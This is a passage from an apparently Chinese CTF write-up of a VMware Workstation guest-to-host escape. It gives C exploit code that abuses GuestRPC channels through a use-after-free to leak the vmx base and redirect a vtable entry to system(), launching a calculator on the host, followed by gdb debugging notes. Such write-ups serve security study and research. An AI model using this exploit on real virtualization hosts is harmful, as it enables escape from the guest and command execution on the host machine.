BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFD0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中修改了长亭师傅的一个魔数，目的是达到no enhanced。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png" alt="图片.png"></p><p>其中构造的exploit如下。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png" alt="图片.png"><br> 开启四个channel</p><p>然后free（0）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png" alt="图片.png"></p><p>set之后再次free(0)</p><p>此时往channel 1 可以写入bss段的地址。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png" alt="图片.png"></p><p>此时fd被链接进去之后可以直接malloc出来然后改写即可。</p><p>此处覆盖的位置为bss段的一处调用</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png" alt="图片.png"></p><p>可以看出来这块的虚表调用位置在FE95B0，+8即为FE95B8，所以此处改为system然后第一个参数（FE95C0）改为，弹出计算器的指令即可。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>打开环境，ssh链接guest，然后sudo gdb .&#x2F;vmx -q，使用ps -aux | grep vmx找到对应的进程，attach上去，在ssh端口运行exp即可（记得先打断点，我断在了漏洞函数free的地方，方便看chunk）</p><p>第一次free前</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png" alt="图片.png"></p><p>直接按了continue。。堆分配特别乱，于是重新来过。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png" alt="图片.png"></p><p>断点找出漏洞函数。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png" alt="图片.png"></p><p>这是bufA的地址。记住0x7f35000210f0（user开头区域）</p><p>经过UAF之后，这里把虚表写入bufB，</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png" alt="图片.png"></p><p>成功。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png" alt="图片.png"></p><p>查看后发现确实是vtable。</p><p>基址就可以leak出来了。后面是基本的劫持fd操作，不调试了，直接看到弹出计算器。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png" alt="图片.png"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml</a></p><p><a href="https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib">https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib</a></p><p><a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p><p><a href="https://zhuanlan.zhihu.com/p/27733895">https://zhuanlan.zhihu.com/p/27733895</a></p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
